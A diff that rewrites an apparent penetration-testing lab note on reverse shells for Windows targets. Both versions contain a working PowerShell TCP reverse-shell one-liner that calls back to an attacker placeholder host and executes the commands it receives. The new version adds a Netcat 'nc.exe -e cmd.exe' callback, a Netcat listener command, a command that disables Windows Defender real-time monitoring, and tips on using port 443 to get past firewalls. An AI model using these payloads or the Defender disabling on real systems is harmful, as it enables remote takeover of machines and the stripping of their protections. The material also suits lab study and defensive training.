@@ -1,61 +1,60 @@
-# Reverse Shells
+**METHODOLOGY**
 
-A **reverse shell** requires the attack machine to run a listener while the target initiates the connection back to the attacker. This technique is preferred because **outbound connections** are frequently overlooked by administrators and are more likely to bypass firewall restrictions compared to bind shells.
-
-### Methodology & Decision Logic
-
-- **When to use:** Use when inbound connections to the target are blocked by a firewall but outbound traffic is permitted.
-- **Port Selection:** Utilize **common ports** like **443** (HTTPS) for the listener. This ensures the connection is less likely to be blocked by OS or network-level firewalls, as these ports are typically open for standard business operations.
-- **Tool Selection:** Prioritize **native tools** (Living Off the Land) such as **PowerShell** on Windows targets. Non-native tools like Netcat require transferring binaries, which is difficult without initial file upload capabilities and increases the chance of detection.
-- **Evasion Note:** While common ports bypass basic firewall rules, firewalls with **Deep Packet Inspection (DPI)** or Layer 7 visibility may still detect and block reverse shells by examining packet contents.
+1. Start a listener on `<ATTACK_IP>` using port 443 to mimic HTTPS traffic and bypass basic outbound filtering.
+2. Identify native tools on the Windows target to avoid unnecessary file transfers of non-native binaries like Netcat.
+3. Execute the PowerShell TCP client one-liner.
+4. If execution fails with a **ScriptContainedMaliciousContent** error, verify privileges and attempt to disable real-time monitoring.
+5. Confirm connection on the listener and verify identity with `whoami`.
 
 ---
 
-### Operational Workflow
+## Reverse Shell Listener
 
-1. **Start a Listener:** Prepare the attack machine to receive the connection.
-2. **Prepare the Target:** If required for the scenario/demonstration, disable security software that blocks malicious scripts.
-3. **Execute Payload:** Run the reverse shell command on the target system to initiate the connection.
+Use when inbound connections to the target are blocked by a firewall or to increase the chance of remaining undetected by leveraging common outbound ports.
 
----
-
-### Command Reference
-
-#### Attack Box Listener
-
-Use Netcat to listen for incoming connections from the target.
-
-|Parameter|Description|
-|:--|:--|
-|`-l`|Listen mode, for inbound connects|
-|`-v`|Verbose|
-|`-n`|Numeric-only IP addresses, no DNS|
-|`-p`|Local port number|
+Start a Netcat listener on a port likely to be allowed outbound through network-level firewalls
 
 ```
 sudo nc -lvnp <PORT>
 ```
 
-#### Windows Target: Defensive Disable
+- Tool comparison
+    
+    - Netcat -> `nc -lvnp <PORT>` -> standard listener for quick shell capture.
+- Gotchas **Deep packet inspection** at Layer 7 can identify and block reverse shell traffic even on common ports like 443.
+    
 
-If **Windows Defender** blocks the payload execution with a "ScriptContainedMaliciousContent" error, real-time monitoring may need to be disabled from an administrative PowerShell console.
+## PowerShell Native Payload
 
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
+Use when you need to establish a shell on a Windows target without transferring external binaries like Netcat.
 
-#### Windows Target: PowerShell Reverse Shell
-
-This one-liner uses native .NET objects to create a TCP client and redirect the shell stream to the attack machine.
+Execute a PowerShell-based TCP client to connect back to the listener
 
 ```
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACK_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
----
+- Tool comparison
+    
+    - PowerShell -> One-liner above -> prefer for living off the land on modern Windows targets.
+    - Netcat (Windows) -> `nc.exe <ATTACK_IP> <PORT> -e cmd.exe` -> prefer only if the binary is already present or file upload is trivial.
+- Edge cases
+    
+    - Browser-based clipboard features in Pwnbox may mangle the payload during pasting.
+- Gotchas **Clipboard mangling** can break the one-liner; paste into Notepad on the target first, then copy-paste into the CLI.
+    
 
-### Attack Implications & Considerations
+## Windows Defender Evasion
 
-- **Payload Customization:** Security teams often monitor public repositories (like Reverse Shell Cheat Sheets). Customizing payloads may be necessary to bypass tuned security controls.
-- **UI Constraints:** When using Pwnbox, the browser clipboard might not paste correctly into the target CLI; paste into the target's **Notepad** first as an intermediate step.
-- **Access Level:** Successful execution provides interactive access to the OS and file system, indicated by a prompt change (e.g., `PS C:\>`).
+Use when the target OS blocks payload execution with a **ParserError** or specifically identifies the script as malicious content.
+
+Disable real-time monitoring to allow the execution of known malicious payloads
+
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+- Dangerous / misconfigured settings
+    
+    - Administrative PowerShell console access is required to modify Defender preferences.
+- Gotchas **Insufficient privileges** will cause the disable command to fail; must be run from an elevated prompt.
